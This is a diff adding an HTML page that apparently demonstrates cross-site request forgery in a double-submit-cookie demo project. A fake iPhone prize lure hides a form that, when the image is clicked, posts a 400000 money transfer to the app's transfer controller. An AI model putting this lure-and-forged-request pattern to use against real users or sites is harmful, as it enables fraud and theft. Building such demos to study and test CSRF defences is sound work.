@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="ISO-8859-1">
+		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+		
+		<title>Fabricated - On Image Click - Form</title>
+		
+		<style>
+			.center {
+				 display: block;
+				 margin-left: auto;
+				 margin-right: auto;
+				 height: 490px;
+				 width: 350px;
+				 }
+		</style>
+	</head>
+
+	<body onload="hideForm()">
+		<h2 align="center">MySite Gifting</h2>
+		<h3 align="center">Contratulations!</h3>
+		<p align="center"><i>You have being just selected as a winner to receive an IPhoneX.
+				</br>
+			  Click the below image to confirm the acceptance.
+		   </i>
+		</p>
+
+		<div class="imgcontainer">
+			<img src="/xsrfdoublesubmitcookie/resrcs/imgs/iphonex.jpg" alt="Avatar" class="center" onclick="submitHiddenForm()">
+		</div>
+
+		<!-- 
+			FORM FORM FORM FORM FORM FORM FORM FORM FORM FORM FORM FORM FORM FORM FORM FORM FORM FORM FORM FORM FORM FORM FORM FORM FORM FORM FORM FORM FORM FORM FORM
+	 	-->
+   		<form id="moneyTransferenceForm" action="/xsrfdoublesubmitcookie/TransferenceController" method="post">
+			<input type="text" name="accountNo" value="123456789">
+			<input type="text" name="transferAmount" value="400000">
+		</form>
+		
+		<script type="text/javascript">
+			function hideForm() {
+				  document.getElementById("moneyTransferenceForm").style.display="none"
+			}
+			
+			function submitHiddenForm() {
+				document.getElementById("moneyTransferenceForm").submit();
+			}
+		</script>
+	</body>
+</html>
